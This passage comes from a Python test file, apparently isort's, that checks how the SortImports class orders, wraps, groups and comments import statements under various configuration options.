lib13\\n\"\n                           \"from third_party import lib14\\n\"\n                           \"from third_party import lib15\\n\"\n                           \"from third_party import lib16\\n\"\n                           \"from third_party import lib17\\n\"\n                           \"from third_party import lib18\\n\"\n                           \"from third_party import lib20\\n\"\n                           \"from third_party import lib21\\n\"\n                           \"from third_party import lib22\\n\")\n\n\ndef test_force_single_line_long_imports():\n    test_input = (\"from veryveryveryveryveryvery import small, big\\n\")\n    test_output = SortImports(file_contents=test_input, multi_line_output=WrapModes.NOQA,\n                              line_length=40, force_single_line=True).output\n    assert test_output == (\"from veryveryveryveryveryvery import big\\n\"\n                           \"from veryveryveryveryveryvery import small  # NOQA\\n\")\n\n\ndef test_titled_imports():\n    \"\"\"Tests setting custom titled/commented import sections.\"\"\"\n    test_input = (\"import sys\\n\"\n                  \"import unicodedata\\n\"\n                  \"import statistics\\n\"\n                  \"import os\\n\"\n                  \"import myproject.test\\n\"\n                  \"import django.settings\")\n    test_output = SortImports(file_contents=test_input, known_third_party=['django'],\n                              import_heading_stdlib=\"Standard Library\", import_heading_firstparty=\"My Stuff\").output\n    assert test_output == (\"# Standard Library\\n\"\n                           \"import os\\n\"\n                           \"import statistics\\n\"\n                           \"import sys\\n\"\n                           \"import unicodedata\\n\"\n                           \"\\n\"\n                           \"import django.settings\\n\"\n                           \"\\n\"\n                           \"# My Stuff\\n\"\n                           \"import myproject.test\\n\")\n    test_second_run = SortImports(file_contents=test_output, known_third_party=['django'],\n                                  import_heading_stdlib=\"Standard Library\", import_heading_firstparty=\"My Stuff\").output\n    assert test_second_run == test_output\n\n\ndef test_balanced_wrapping():\n    \"\"\"Tests balanced wrapping mode, where the length of individual lines maintain width.\"\"\"\n    test_input = (\"from __future__ import (absolute_import, division, print_function,\\n\"\n                  \"                        unicode_literals)\")\n    test_output = SortImports(file_contents=test_input, line_length=70, balanced_wrapping=True).output\n    assert test_output == (\"from __future__ import (absolute_import, division,\\n\"\n                           \"                        print_function, unicode_literals)\\n\")\n\n\ndef test_relative_import_with_space():\n    \"\"\"Tests the case where the relation and the module that is being imported from is separated with a space.\"\"\"\n    test_input = (\"from ... fields.sproqet import SproqetCollection\")\n    assert SortImports(file_contents=test_input).output == (\"from ...fields.sproqet import SproqetCollection\\n\")\n    test_input = (\"from .import foo\")\n    test_output = (\"from . import foo\\n\")\n    assert SortImports(file_contents=test_input).output == test_output\n    test_input = (\"from.import foo\")\n    test_output = (\"from . import foo\\n\")\n    assert SortImports(file_contents=test_input).output == test_output\n\n\ndef test_multiline_import():\n    \"\"\"Test the case where import spawns multiple lines with inconsistent indentation.\"\"\"\n    test_input = (\"from pkg \\\\\\n\"\n                  \"    import stuff, other_suff \\\\\\n\"\n                  \"               more_stuff\")\n    assert SortImports(file_contents=test_input).output == (\"from pkg import more_stuff, other_suff, stuff\\n\")\n\n    # test again with a custom configuration\n    custom_configuration = {'force_single_line': True,\n                            'line_length': 120,\n                            'known_first_party': ['asdf', 'qwer'],\n                            'default_section': 'THIRDPARTY',\n                            'forced_separate': 'asdf'}  # type: Dict[str, Any]\n    expected_output = (\"from pkg import more_stuff\\n\"\n                       \"from pkg import other_suff\\n\"\n                       \"from pkg import stuff\\n\")\n    assert SortImports(file_contents=test_input, **custom_configuration).output == expected_output\n\n\ndef test_single_multiline():\n    \"\"\"Test the case where a single import spawns multiple lines.\"\"\"\n    test_input = (\"from os import\\\\\\n\"\n                  \"        getuid\\n\"\n                  \"\\n\"\n                  \"print getuid()\\n\")\n    output = SortImports(file_contents=test_input).output\n    assert output == (\n        \"from os import getuid\\n\"\n        \"\\n\"\n        \"print getuid()\\n\"\n    )\n\n\ndef test_atomic_mode():\n    # without syntax error, everything works OK\n    test_input = (\"from b import d, c\\n\"\n                  \"from a import f, e\\n\")\n    assert SortImports(file_contents=test_input, atomic=True).output == (\"from a import e, f\\n\"\n                                                                          \"from b import c, d\\n\")\n\n    # with syntax error content is not changed\n    test_input += \"while True print 'Hello world'\"  # blatant syntax error\n    assert SortImports(file_contents=test_input, atomic=True).output == test_input\n\n\ndef test_order_by_type():\n    test_input = \"from module import Class, CONSTANT, function\"\n    assert SortImports(file_contents=test_input,\n                       order_by_type=True).output == (\"from module import CONSTANT, Class, function\\n\")\n\n    # More complex sample data\n    test_input = \"from module import Class, CONSTANT, function, BASIC, Apple\"\n    assert SortImports(file_contents=test_input,\n                       order_by_type=True).output == (\"from module import BASIC, CONSTANT, Apple, Class, function\\n\")\n\n    # Really complex sample data, to verify we don't mess with top level imports, only nested ones\n    test_input = (\"import StringIO\\n\"\n                  \"import glob\\n\"\n                  \"import os\\n\"\n                  \"import shutil\\n\"\n                  \"import tempfile\\n\"\n                  \"import time\\n\"\n                  \"from subprocess import PIPE, Popen, STDOUT\\n\")\n\n    assert SortImports(file_contents=test_input, order_by_type=True).output == \\\n                (\"import glob\\n\"\n                 \"import os\\n\"\n                 \"import shutil\\n\"\n                 \"import StringIO\\n\"\n                 \"import tempfile\\n\"\n                 \"import time\\n\"\n                 \"from subprocess import PIPE, STDOUT, Popen\\n\")\n\n\ndef test_custom_lines_after_import_section():\n    \"\"\"Test the case where the number of lines to output after imports has been explicitly set.\"\"\"\n    test_input = (\"from a import b\\n\"\n                  \"foo = 'bar'\\n\")\n\n    # default case is one space if not method or class after imports\n    assert SortImports(file_contents=test_input).output == (\"from a import b\\n\"\n                                                            \"\\n\"\n                                                            \"foo = 'bar'\\n\")\n\n    # test again with a custom number of lines after the import section\n    assert SortImports(file_contents=test_input, lines_after_imports=2).output == (\"from a import b\\n\"\n                                                                                   \"\\n\"\n                                                                                   \"\\n\"\n                                                                                   \"foo = 'bar'\\n\")\n\n\ndef test_smart_lines_after_import_section():\n    \"\"\"Tests the default 'smart' behavior for dealing with lines after the import section\"\"\"\n    # one space if not method or class after imports\n    test_input = (\"from a import b\\n\"\n                  \"foo = 'bar'\\n\")\n    assert SortImports(file_contents=test_input).output == (\"from a import b\\n\"\n                                                            \"\\n\"\n                                                            \"foo = 'bar'\\n\")\n\n    # two spaces if a method or class after imports\n    test_input = (\"from a import b\\n\"\n                  \"def my_function():\\n\"\n                  \"    pass\\n\")\n    assert SortImports(file_contents=test_input).output == (\"from a import b\\n\"\n                                                            \"\\n\"\n                                                            \"\\n\"\n                                                            \"def my_function():\\n\"\n                                                            \"    pass\\n\")\n\n    # two spaces if an async method after imports\n    test_input = (\"from a import b\\n\"\n                  \"async def my_function():\\n\"\n                  \"    pass\\n\")\n    assert SortImports(file_contents=test_input).output == (\"from a import b\\n\"\n                                                            \"\\n\"\n                                                            \"\\n\"\n                                                            \"async def my_function():\\n\"\n                                                            \"    pass\\n\")\n\n    # two spaces if a method or class after imports - even if comment before function\n    test_input = (\"from a import b\\n\"\n                  \"# comment should be ignored\\n\"\n                  \"def my_function():\\n\"\n                  \"    pass\\n\")\n    assert SortImports(file_contents=test_input).output == (\"from a import b\\n\"\n                                                            \"\\n\"\n                                                            \"\\n\"\n                                                            \"# comment should be ignored\\n\"\n                                                            \"def my_function():\\n\"\n                                                            \"    pass\\n\")\n\n    # ensure logic works with both style comments\n    test_input = (\"from a import b\\n\"\n                  '\"\"\"\\n'\n                  \"    comment should be ignored\\n\"\n                  '\"\"\"\\n'\n                  \"def my_function():\\n\"\n                  \"    pass\\n\")\n    assert SortImports(file_contents=test_input).output == (\"from a import b\\n\"\n                                                            \"\\n\"\n                                                            \"\\n\"\n                                                            '\"\"\"\\n'\n                                                            \"    comment should be ignored\\n\"\n                                                            '\"\"\"\\n'\n                                                            \"def my_function():\\n\"\n                                                            \"    pass\\n\")\n\n    # Ensure logic doesn't incorrectly skip over assignments to multi-line strings\n    test_input = (\"from a import b\\n\"\n                  'X = \"\"\"test\\n'\n                  '\"\"\"\\n'\n                  \"def my_function():\\n\"\n                  \"    pass\\n\")\n    assert SortImports(file_contents=test_input).output == (\"from a import b\\n\"\n                                                            \"\\n\"\n                                                            'X = \"\"\"test\\n'\n                                                            '\"\"\"\\n'\n                                                            \"def my_function():\\n\"\n                                                            \"    pass\\n\")\n\n\ndef test_settings_combine_instead_of_overwrite():\n    \"\"\"Test to ensure settings combine logically, instead of fully overwriting.\"\"\"\n    assert set(SortImports(known_standard_library=['not_std_library']).config['known_standard_library']) == \\\n           set(SortImports().config['known_standard_library'] + ['not_std_library'])\n\n    assert set(SortImports(not_known_standard_library=['thread']).config['known_standard_library']) == \\\n           {item for item in SortImports().config['known_standard_library'] if item != 'thread'}\n\n\ndef test_combined_from_and_as_imports():\n    \"\"\"Test to ensure it's possible to combine from and as imports.\"\"\"\n    test_input = (\"from translate.misc.multistring import multistring\\n\"\n                  \"from translate.storage import base, factory\\n\"\n                  \"from translate.storage.placeables import general, parse as rich_parse\\n\")\n    assert SortImports(file_contents=test_input, combine_as_imports=True).output == test_input\n    test_input = (\"import os \\nimport os as _os\")\n    test_output = (\"import os\\nimport os as _os\\n\")\n    assert SortImports(file_contents=test_input, keep_direct_and_as_imports=True).output == test_output\n\n\ndef test_as_imports_with_line_length():\n    \"\"\"Test to ensure it's possible to combine from and as imports.\"\"\"\n    test_input = (\"from translate.storage import base as storage_base\\n\"\n                  \"from translate.storage.placeables import general, parse as rich_parse\\n\")\n    assert SortImports(file_contents=test_input, combine_as_imports=False, line_length=40).output == \\\n                  (\"from translate.storage import \\\\\\n    base as storage_base\\n\"\n                   \"from translate.storage.placeables import \\\\\\n    general\\n\"\n                   \"from translate.storage.placeables import \\\\\\n    parse as rich_parse\\n\")\n\n\ndef test_keep_comments():\n    \"\"\"Test to ensure isort properly keeps comments in tact after sorting.\"\"\"\n    # Straight Import\n    test_input = (\"import foo  # bar\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n    # Star import\n    test_input_star = (\"from foo import *  # bar\\n\")\n    assert SortImports(file_contents=test_input_star).output == test_input_star\n\n    # Force Single Line From Import\n    test_input = (\"from foo import bar  # comment\\n\")\n    assert SortImports(file_contents=test_input, force_single_line=True).output == test_input\n\n    # From import\n    test_input = (\"from foo import bar  # My Comment\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n    # More complicated case\n    test_input = (\"from a import b  # My Comment1\\n\"\n                  \"from a import c  # My Comment2\\n\")\n    assert SortImports(file_contents=test_input).output == \\\n                      (\"from a import b  # My Comment1\\n\"\n                       \"from a import c  # My Comment2\\n\")\n\n    # Test case where imports comments make imports extend pass the line length\n    test_input = (\"from a import b # My Comment1\\n\"\n                  \"from a import c # My Comment2\\n\"\n                  \"from a import d\\n\")\n    assert SortImports(file_contents=test_input, line_length=45).output == \\\n                      (\"from a import b  # My Comment1\\n\"\n                       \"from a import c  # My Comment2\\n\"\n                       \"from a import d\\n\")\n\n    # Test case where imports with comments will be beyond line length limit\n    test_input = (\"from a import b, c  # My Comment1\\n\"\n                  \"from a import c, d # My Comment2 is really really really really long\\n\")\n    assert SortImports(file_contents=test_input, line_length=45).output == \\\n                      (\"from a import (  # My Comment1; My Comment2 is really really really really long\\n\"\n                       \"    b, c, d)\\n\")\n\n    # Test that comments are not stripped from 'import ... as ...' by default\n    test_input = (\"from a import b as bb  # b comment\\n\"\n                  \"from a import c as cc  # c comment\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n    # Test that 'import ... as ...' comments are not collected inappropriately\n    test_input = (\"from a import b as bb  # b comment\\n\"\n                  \"from a import c as cc  # c comment\\n\"\n                  \"from a import d\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n    assert SortImports(file_contents=test_input, combine_as_imports=True).output == (\n        \"from a import b as bb, c as cc, d  # b comment; c comment\\n\"\n    )\n\n\ndef test_multiline_split_on_dot():\n    \"\"\"Test to ensure isort correctly handles multiline imports, even when split right after a '.'\"\"\"\n    test_input = (\"from my_lib.my_package.test.level_1.level_2.level_3.level_4.level_5.\\\\\\n\"\n                  \"    my_module import my_function\")\n    assert SortImports(file_contents=test_input, line_length=70).output == \\\n            (\"from my_lib.my_package.test.level_1.level_2.level_3.level_4.level_5.my_module import \\\\\\n\"\n             \"    my_function\\n\")\n\n\ndef test_import_star():\n    \"\"\"Test to ensure isort handles star imports correctly\"\"\"\n    test_input = (\"from blah import *\\n\"\n                  \"from blah import _potato\\n\")\n    assert SortImports(file_contents=test_input).output == (\"from blah import *\\n\"\n                                                            \"from blah import _potato\\n\")\n    assert SortImports(file_contents=test_input, combine_star=True).output == (\"from blah import *\\n\")\n\n\ndef test_include_trailing_comma():\n    \"\"\"Test for the include_trailing_comma option\"\"\"\n    test_output_grid = SortImports(\n        file_contents=SHORT_IMPORT,\n        multi_line_output=WrapModes.GRID,\n        line_length=40,\n        include_trailing_comma=True,\n    ).output\n    assert test_output_grid == (\n        \"from third_party import (lib1, lib2,\\n\"\n        \"                         lib3, lib4,)\\n\"\n    )\n\n    test_output_vertical = SortImports(\n        file_contents=SHORT_IMPORT,\n        multi_line_output=WrapModes.VERTICAL,\n        line_length=40,\n        include_trailing_comma=True,\n    ).output\n    assert test_output_vertical == (\n        \"from third_party import (lib1,\\n\"\n        \"                         lib2,\\n\"\n        \"                         lib3,\\n\"\n        \"                         lib4,)\\n\"\n    )\n\n    test_output_vertical_indent = SortImports(\n        file_contents=SHORT_IMPORT,\n        multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,\n        line_length=40,\n        include_trailing_comma=True,\n    ).output\n    assert test_output_vertical_indent == (\n        \"from third_party import (\\n\"\n        \"    lib1,\\n\"\n        \"    lib2,\\n\"\n        \"    lib3,\\n\"\n        \"    lib4,\\n\"\n        \")\\n\"\n    )\n\n    test_output_vertical_grid = SortImports(\n        file_contents=SHORT_IMPORT,\n        multi_line_output=WrapModes.VERTICAL_GRID,\n        line_length=40,\n        include_trailing_comma=True,\n    ).output\n    assert test_output_vertical_grid == (\n        \"from third_party import (\\n\"\n        \"    lib1, lib2, lib3, lib4,)\\n\"\n    )\n\n    test_output_vertical_grid_grouped = SortImports(\n        file_contents=SHORT_IMPORT,\n        multi_line_output=WrapModes.VERTICAL_GRID_GROUPED,\n        line_length=40,\n        include_trailing_comma=True,\n    ).output\n    assert test_output_vertical_grid_grouped == (\n        \"from third_party import (\\n\"\n        \"    lib1, lib2, lib3, lib4,\\n\"\n        \")\\n\"\n    )\n\n    test_output_wrap_single_import_with_use_parentheses = SortImports(\n        file_contents=SINGLE_FROM_IMPORT,\n        line_length=25,\n        include_trailing_comma=True,\n        use_parentheses=True\n    ).output\n    assert test_output_wrap_single_import_with_use_parentheses == (\n        \"from third_party import (\\n\"\n        \"    lib1,)\\n\"\n    )\n\n    test_output_wrap_single_import_vertical_indent = SortImports(\n        file_contents=SINGLE_FROM_IMPORT,\n        line_length=25,\n        multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,\n        include_trailing_comma=True,\n        use_parentheses=True\n    ).output\n    assert test_output_wrap_single_import_vertical_indent == (\n        \"from third_party import (\\n\"\n        \"    lib1,\\n\"\n        \")\\n\"\n    )\n\n\ndef test_similar_to_std_library():\n    \"\"\"Test to ensure modules that are named similarly to a standard library import don't end up clobbered\"\"\"\n    test_input = (\"import datetime\\n\"\n                  \"\\n\"\n                  \"import requests\\n\"\n                  \"import times\\n\")\n    assert SortImports(file_contents=test_input, known_third_party=[\"requests\", \"times\"]).output == test_input\n\n\ndef test_correctly_placed_imports():\n    \"\"\"Test to ensure comments stay on correct placement after being sorted\"\"\"\n    test_input = (\"from a import b # comment for b\\n\"\n                  \"from a import c # comment for c\\n\")\n    assert SortImports(file_contents=test_input, force_single_line=True).output == \\\n                      (\"from a import b  # comment for b\\n\"\n                       \"from a import c  # comment for c\\n\")\n    assert SortImports(file_contents=test_input).output == (\"from a import b  # comment for b\\n\"\n                                                            \"from a import c  # comment for c\\n\")\n\n    # Full example test from issue #143\n    test_input = (\"from itertools import chain\\n\"\n                  \"\\n\"\n                  \"from django.test import TestCase\\n\"\n                  \"from model_mommy import mommy\\n\"\n                  \"\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import associate_right_for_item_product\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import associate_right_for_item_product_d\"\n                  \"efinition\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import associate_right_for_item_product_d\"\n                  \"efinition_platform\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import associate_right_for_item_product_p\"\n                  \"latform\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import associate_right_for_territory_reta\"\n                  \"il_model\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import associate_right_for_territory_reta\"\n                  \"il_model_definition_platform_provider  # noqa\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import clear_right_for_item_product\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import clear_right_for_item_product_defini\"\n                  \"tion\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import clear_right_for_item_product_defini\"\n                  \"tion_platform\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import clear_right_for_item_product_platfo\"\n                  \"rm\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import clear_right_for_territory_retail_mo\"\n                  \"del\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import clear_right_for_territory_retail_mo\"\n                  \"del_definition_platform_provider  # noqa\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import create_download_usage_right\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import delete_download_usage_right\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import disable_download_for_item_product\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import disable_download_for_item_product_d\"\n                  \"efinition\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import disable_download_for_item_product_d\"\n                  \"efinition_platform\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import disable_download_for_item_product_p\"\n                  \"latform\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import disable_download_for_territory_reta\"\n                  \"il_model\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import disable_download_for_territory_reta\"\n                  \"il_model_definition_platform_provider  # noqa\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import get_download_rights_for_item\\n\"\n                  \"from apps.clientman.commands.download_usage_rights import get_right\\n\")\n    assert SortImports(file_contents=test_input, force_single_line=True, line_length=140,\n                       known_third_party=[\"django\", \"model_mommy\"]).output == test_input\n\n\ndef test_auto_detection():\n    \"\"\"Initial test to ensure isort auto-detection works correctly - will grow over time as new issues are raised.\"\"\"\n\n    # Issue 157\n    test_input = (\"import binascii\\n\"\n                  \"import os\\n\"\n                  \"\\n\"\n                  \"import cv2\\n\"\n                  \"import requests\\n\")\n    assert SortImports(file_contents=test_input, known_third_party=[\"cv2\", \"requests\"]).output == test_input\n\n    # alternative solution\n    assert SortImports(file_contents=test_input, default_section=\"THIRDPARTY\").output == test_input\n\n\ndef test_same_line_statements():\n    \"\"\"Ensure isort correctly handles the case where a single line contains multiple statements including an import\"\"\"\n    test_input = (\"import pdb; import nose\\n\")\n    assert SortImports(file_contents=test_input).output == (\"import pdb\\n\"\n                                                            \"\\n\"\n                                                            \"import nose\\n\")\n\n    test_input = (\"import pdb; pdb.set_trace()\\n\"\n                  \"import nose; nose.run()\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_long_line_comments():\n    \"\"\"Ensure isort correctly handles comments at the end of extremely long lines\"\"\"\n    test_input = (\"from foo.utils.fabric_stuff.live import check_clean_live, deploy_live, sync_live_envdir, \"\n                  \"update_live_app, update_live_cron  # noqa\\n\"\n                  \"from foo.utils.fabric_stuff.stage import check_clean_stage, deploy_stage, sync_stage_envdir, \"\n                  \"update_stage_app, update_stage_cron  # noqa\\n\")\n    assert SortImports(file_contents=test_input).output == \\\n                (\"from foo.utils.fabric_stuff.live import (check_clean_live, deploy_live,  # noqa\\n\"\n                 \"                                         sync_live_envdir, update_live_app, update_live_cron)\\n\"\n                 \"from foo.utils.fabric_stuff.stage import (check_clean_stage, deploy_stage,  # noqa\\n\"\n                 \"                                          sync_stage_envdir, update_stage_app, update_stage_cron)\\n\")\n\n\ndef test_tab_character_in_import():\n    \"\"\"Ensure isort correctly handles import statements that contain a tab character\"\"\"\n    test_input = (\"from __future__ import print_function\\n\"\n                  \"from __future__ import\\tprint_function\\n\")\n    assert SortImports(file_contents=test_input).output == \"from __future__ import print_function\\n\"\n\n\ndef test_split_position():\n    \"\"\"Ensure isort splits on import instead of . when possible\"\"\"\n    test_input = (\"from p24.shared.exceptions.master.host_state_flag_unchanged import HostStateUnchangedException\\n\")\n    assert SortImports(file_contents=test_input, line_length=80).output == \\\n                                            (\"from p24.shared.exceptions.master.host_state_flag_unchanged import \\\\\\n\"\n                                             \"    HostStateUnchangedException\\n\")\n\n\ndef test_place_comments():\n    \"\"\"Ensure manually placing imports works as expected\"\"\"\n    test_input = (\"import sys\\n\"\n                  \"import os\\n\"\n                  \"import myproject.test\\n\"\n                  \"import django.settings\\n\"\n                  \"\\n\"\n                  \"# isort:imports-thirdparty\\n\"\n                  \"# isort:imports-firstparty\\n\"\n                  \"print('code')\\n\"\n                  \"\\n\"\n                  \"# isort:imports-stdlib\\n\")\n    expected_output = (\"\\n# isort:imports-thirdparty\\n\"\n                       \"import django.settings\\n\"\n                       \"\\n\"\n                       \"# isort:imports-firstparty\\n\"\n                       \"import myproject.test\\n\"\n                       \"\\n\"\n                       \"print('code')\\n\"\n                       \"\\n\"\n                       \"# isort:imports-stdlib\\n\"\n                       \"import os\\n\"\n                       \"import sys\\n\")\n    test_output = SortImports(file_contents=test_input, known_third_party=['django']).output\n    assert test_output == expected_output\n    test_output = SortImports(file_contents=test_output, known_third_party=['django']).output\n    assert test_output == expected_output\n\n\ndef test_placement_control():\n    \"\"\"Ensure that most specific placement control match wins\"\"\"\n    test_input = (\"import os\\n\"\n                  \"import sys\\n\"\n                  \"from bottle import Bottle, redirect, response, run\\n\"\n                  \"import p24.imports._argparse as argparse\\n\"\n                  \"import p24.imports._subprocess as subprocess\\n\"\n                  \"import p24.imports._VERSION as VERSION\\n\"\n                  \"import p24.shared.media_wiki_syntax as syntax\\n\")\n    test_output = SortImports(file_contents=test_input,\n                known_first_party=['p24', 'p24.imports._VERSION'],\n                known_standard_library=['p24.imports'],\n                known_third_party=['bottle'],\n                default_section=\"THIRDPARTY\").output\n\n    assert test_output == (\"import os\\n\"\n                           \"import p24.imports._argparse as argparse\\n\"\n                           \"import p24.imports._subprocess as subprocess\\n\"\n                           \"import sys\\n\"\n                           \"\\n\"\n                           \"from bottle import Bottle, redirect, response, run\\n\"\n                           \"\\n\"\n                           \"import p24.imports._VERSION as VERSION\\n\"\n                           \"import p24.shared.media_wiki_syntax as syntax\\n\")\n\n\ndef test_custom_sections():\n    \"\"\"Ensure that most specific placement control match wins\"\"\"\n    test_input = (\"import os\\n\"\n                  \"import sys\\n\"\n                  \"from django.conf import settings\\n\"\n                  \"from bottle import Bottle, redirect, response, run\\n\"\n                  \"import p24.imports._argparse as argparse\\n\"\n                  \"from django.db import models\\n\"\n                  \"import p24.imports._subprocess as subprocess\\n\"\n                  \"import pandas as pd\\n\"\n                  \"import p24.imports._VERSION as VERSION\\n\"\n                  \"import numpy as np\\n\"\n                  \"import p24.shared.media_wiki_syntax as syntax\\n\")\n    test_output = SortImports(file_contents=test_input,\n                known_first_party=['p24', 'p24.imports._VERSION'],\n                import_heading_stdlib='Standard Library',\n                import_heading_thirdparty='Third Party',\n                import_heading_firstparty='First Party',\n                import_heading_django='Django',\n                import_heading_pandas='Pandas',\n                known_standard_library=['p24.imports'],\n                known_third_party=['bottle'],\n                known_django=['django'],\n                known_pandas=['pandas', 'numpy'],\n                default_section=\"THIRDPARTY\",\n                sections=[\"FUTURE\", \"STDLIB\", \"DJANGO\", \"THIRDPARTY\", \"PANDAS\", \"FIRSTPARTY\", \"LOCALFOLDER\"]).output\n    assert test_output == (\"# Standard Library\\n\"\n                           \"import os\\n\"\n                           \"import p24.imports._argparse as argparse\\n\"\n                           \"import p24.imports._subprocess as subprocess\\n\"\n                           \"import sys\\n\"\n                           \"\\n\"\n                           \"# Django\\n\"\n                           \"from django.conf import settings\\n\"\n                           \"from django.db import models\\n\"\n                           \"\\n\"\n                           \"# Third Party\\n\"\n                           \"from bottle import Bottle, redirect, response, run\\n\"\n                           \"\\n\"\n                           \"# Pandas\\n\"\n                           \"import numpy as np\\n\"\n                           \"import pandas as pd\\n\"\n                           \"\\n\"\n                           \"# First Party\\n\"\n                           \"import p24.imports._VERSION as VERSION\\n\"\n                           \"import p24.shared.media_wiki_syntax as syntax\\n\")\n\n\ndef test_glob_known():\n    \"\"\"Ensure that most specific placement control match wins\"\"\"\n    test_input = (\"import os\\n\"\n                  \"from django_whatever import whatever\\n\"\n                  \"import sys\\n\"\n                  \"from django.conf import settings\\n\"\n                  \"from . import another\\n\")\n    test_output = SortImports(file_contents=test_input,\n                import_heading_stdlib='Standard Library',\n                import_heading_thirdparty='Third Party',\n                import_heading_firstparty='First Party',\n                import_heading_django='Django',\n                import_heading_djangoplugins='Django Plugins',\n                import_heading_localfolder='Local',\n                known_django=['django'],\n                known_djangoplugins=['django_*'],\n                default_section=\"THIRDPARTY\",\n                sections=[\"FUTURE\", \"STDLIB\", \"DJANGO\", \"DJANGOPLUGINS\", \"THIRDPARTY\", \"FIRSTPARTY\", \"LOCALFOLDER\"]).output\n    assert test_output == (\"# Standard Library\\n\"\n                           \"import os\\n\"\n                           \"import sys\\n\"\n                           \"\\n\"\n                           \"# Django\\n\"\n                           \"from django.conf import settings\\n\"\n                           \"\\n\"\n                           \"# Django Plugins\\n\"\n                           \"from django_whatever import whatever\\n\"\n                           \"\\n\"\n                           \"# Local\\n\"\n                           \"from . import another\\n\")\n\n\ndef test_sticky_comments():\n    \"\"\"Test to ensure it is possible to make comments 'stick' above imports\"\"\"\n    test_input = (\"import os\\n\"\n                  \"\\n\"\n                  \"# Used for type-hinting (ref: https://github.com/davidhalter/jedi/issues/414).\\n\"\n                  \"from selenium.webdriver.remote.webdriver import WebDriver  # noqa\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n    test_input = (\"from django import forms\\n\"\n                  \"# While this couples the geographic forms to the GEOS library,\\n\"\n                  \"# it decouples from database (by not importing SpatialBackend).\\n\"\n                  \"from django.contrib.gis.geos import GEOSException, GEOSGeometry\\n\"\n                  \"from django.utils.translation import ugettext_lazy as _\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_zipimport():\n    \"\"\"Imports ending in \"import\" shouldn't be clobbered\"\"\"\n    test_input = \"from zipimport import zipimport\\n\"\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_from_ending():\n    \"\"\"Imports ending in \"from\" shouldn't be clobbered.\"\"\"\n    test_input = \"from foo import get_foo_from, get_foo\\n\"\n    expected_output = \"from foo import get_foo, get_foo_from\\n\"\n    assert SortImports(file_contents=test_input).output == expected_output\n\n\ndef test_from_first():\n    \"\"\"Tests the setting from_first works correctly\"\"\"\n    test_input = \"from os import path\\nimport os\\n\"\n    assert SortImports(file_contents=test_input, from_first=True).output == test_input\n\n\ndef test_top_comments():\n    \"\"\"Ensure correct behavior with top comments\"\"\"\n    test_input = (\"# -*- encoding: utf-8 -*-\\n\"\n                  \"# Test comment\\n\"\n                  \"#\\n\"\n                  \"from __future__ import unicode_literals\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n    test_input = (\"# -*- coding: utf-8 -*-\\n\"\n                  \"from django.db import models\\n\"\n                  \"from django.utils.encoding import python_2_unicode_compatible\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n    test_input = (\"# Comment\\n\"\n                  \"import sys\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n    test_input = (\"# -*- coding\\n\"\n                  \"import sys\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_consistency():\n    \"\"\"Ensures consistency of handling even when dealing with non ordered-by-type imports\"\"\"\n    test_input = \"from sqlalchemy.dialects.postgresql import ARRAY, array\\n\"\n    assert SortImports(file_contents=test_input, order_by_type=True).output == test_input\n\n\ndef test_force_grid_wrap():\n    \"\"\"Ensures removing imports works as expected.\"\"\"\n    test_input = (\n      \"from bar import lib2\\n\"\n      \"from foo import lib6, lib7\\n\"\n    )\n    test_output = SortImports(\n      file_contents=test_input,\n      force_grid_wrap=2,\n      multi_line_output=WrapModes.VERTICAL_HANGING_INDENT\n      ).output\n    assert test_output == \"\"\"from bar import lib2\nfrom foo import (\n    lib6,\n    lib7\n)\n\"\"\"\n    test_output = SortImports(\n      file_contents=test_input,\n      force_grid_wrap=3,\n      multi_line_output=WrapModes.VERTICAL_HANGING_INDENT\n      ).output\n    assert test_output == test_input\n\n\ndef test_force_grid_wrap_long():\n    \"\"\"Ensure that force grid wrap still happens with long line length\"\"\"\n    test_input = (\n      \"from foo import lib6, lib7\\n\"\n      \"from bar import lib2\\n\"\n      \"from babar import something_that_is_kind_of_long\"\n    )\n    test_output = SortImports(\n      file_contents=test_input,\n      force_grid_wrap=2,\n      multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,\n      line_length=9999,\n      ).output\n    assert test_output == \"\"\"from babar import something_that_is_kind_of_long\nfrom bar import lib2\nfrom foo import (\n    lib6,\n    lib7\n)\n\"\"\"\n\n\ndef test_uses_jinja_variables():\n    \"\"\"Test a basic set of imports that use jinja variables\"\"\"\n    test_input = (\"import sys\\n\"\n                  \"import os\\n\"\n                  \"import myproject.{ test }\\n\"\n                  \"import django.{ settings }\")\n    test_output = SortImports(file_contents=test_input, known_third_party=['django'],\n                              known_first_party=['myproject']).output\n    assert test_output == (\"import os\\n\"\n                           \"import sys\\n\"\n                           \"\\n\"\n                           \"import django.{ settings }\\n\"\n                           \"\\n\"\n                           \"import myproject.{ test }\\n\")\n\n    test_input = (\"import {{ 